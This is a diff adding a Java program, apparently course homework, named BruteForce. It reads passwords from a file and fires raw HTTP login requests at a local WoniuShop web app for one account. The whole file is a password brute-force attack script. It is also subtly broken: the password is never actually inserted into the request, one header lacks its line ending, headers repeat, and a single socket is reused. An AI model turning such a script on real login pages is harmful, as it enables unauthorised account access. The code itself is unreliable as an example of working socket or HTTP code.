@@ -1,0 +1,111 @@
+package learn.woniuxy.tcphomework;
+
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.UnknownHostException;
+
+/**
+ * 服务端
+ * @author Administrator
+ *
+ */
+public class BruteForce {
+	
+	
+	
+	
+
+	public static void main(String[] args) {
+		Socket brower = null;
+		OutputStream ops = null;
+		InputStream ins = null;
+		ByteArrayOutputStream baos =null;
+		int len;
+		
+		String password = "";
+		
+		String dataStr = "oper=login&account=192106666666&pass="+ password;
+		
+		String str = "POST /WoniuShop1.0.0/useroper HTTP/1.1\r\n" + 
+				"Host: localhost:8080\r\n" + 
+				"Content-Length:" + dataStr.length()+"\r\n" + 
+				"Accept: application/json, text/javascript, */*; q=0.01\r\n" + 
+				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36\r\n" + 
+				"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" + 
+				"Accept-Encoding: gzip, deflate, br\r\n" + 
+				"Accept-Language: zh-CN,zh;q=0.9\r\n" + 
+				"Cookie: JSESSIONID=5F8FCC77D22CBAA9EBA5567C244B43C0" + 
+				"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" + 
+				"Cookie: JSESSIONID=5F8FCC77D22CBAA9EBA5567C244B43C0\r\n"+
+				"\r\n"+dataStr; //data
+		
+		
+		//隔行读取
+		FileReader fr = null;
+		
+		try {
+			fr = new FileReader("a.txt");
+			BufferedReader br = new BufferedReader(fr);
+			brower = new Socket("localhost",8080);
+			while((password=br.readLine())!=null) {
+				ops = brower.getOutputStream();
+				ops.write(str.getBytes());//str转为byte数组
+				ins = brower.getInputStream();
+				
+				byte[] con = new byte[1024];
+				len =-1;
+				baos = new ByteArrayOutputStream();
+				while((len=ins.read(con))!=-1) {
+					baos.write(con,0,len);
+				}
+				System.out.println(baos.toString());	
+				
+			}
+		} catch (FileNotFoundException e1) {
+			e1.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}finally {
+//				try {
+//					if(baos!=null)
+//						baos.close();
+//				} catch (IOException e) {
+//					// TODO Auto-generated catch block
+//					e.printStackTrace();
+//				}
+				try {
+					if(ins!=null)
+						ins.close();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				try {
+					if(ops!=null)
+						ops.close();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				try {
+					if(brower!=null)
+						brower.close();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				
+				
+				
+		}
+		
+		
+	}
+}
